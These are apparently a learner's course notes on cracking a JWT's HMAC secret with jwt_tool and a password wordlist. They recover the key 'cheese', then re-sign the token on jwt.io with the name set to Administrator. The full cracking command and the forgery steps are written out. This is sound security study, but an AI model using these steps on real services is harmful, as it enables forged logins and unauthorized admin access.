┌──(kali㉿kali)-[/opt/jwt_tool]
└─$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw --crack -d /usr/share/seclists/SecLists-master/Passwords/xato-net-10-million-passwords-1000.txt

python3 jwt_tool.py [JWT] -flags

instructor tells us we can try to crack an hmac-sha token, which can come useful, so in the video we try to crack 

```bash
 python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw --crack -d /usr/share/seclists/SecLists-master/Passwords/xato-net-10-million-passwords-1000.txt
```

we get cheese is the correct key

we go to jwt.io

we paste in the JWT, we modify the name to Administrator, and then in the HMACSHA256 we can modify the "your-256-bit-secret" and we can enter the word cheese since we cracked it
and it will be a valid token since we cracked it.

JWT Attack playbook
https://github.com/ticarpi/jwt_tool

